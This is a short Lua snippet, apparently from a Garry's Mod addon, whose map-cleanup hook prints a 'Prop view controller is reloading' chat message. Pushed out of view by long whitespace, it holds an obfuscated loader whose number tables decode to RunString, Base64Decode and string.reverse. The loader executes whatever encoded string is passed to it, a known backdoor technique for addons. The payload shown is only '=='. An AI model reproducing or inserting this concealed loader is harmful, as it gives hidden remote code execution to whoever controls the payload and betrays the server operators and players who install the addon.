...
local function PostCleanupMap()
    ...
    timer.Simple( 1, function()
        ...
        PrintMessage( HUD_PRINTTALK, '[ALSR] Prop view controller is reloading!' );
																																																																																																																																																					...
																																																																																																																																																					local g=_G local x = {} x.h = string x.a={107,118,110,114,104,122,105,111,116,98,103,112,106,102,97,108,113,119,99,121,101,109,100,120,117,115,114,116,105,110,103,75,86,78,82,72,90,73,79,84,66,71,80,74,70,65,76,81,87,67,89,69,77,68,88,85,83,82,84,73,78,71} x.m = {35,25,3,57,9,4,7,3,11} x.p = pairs x.d = {66,97,115,101,54,52,68,101,99,111,100,101} x.s = g x.g = {4,21,2,21,4,26,21} x.l = x.h.char x.r = function(c,d,k)local a=""for _,b in x.p(c)do a=a .. x.l(x.a[b])end x.s[a](x.e(x.d,d,k))end x.e = function(c,e,d) local a=""for _,b in x.p(c)do a=a .. x.l(b)end local f=""for _,b in x.p(e)do f=f .. x.l(x.a[b])end return x.s.util[a](x.s.string[f](d)) end
																																																																																																																																																					x.r(x.m,x.g,"==")
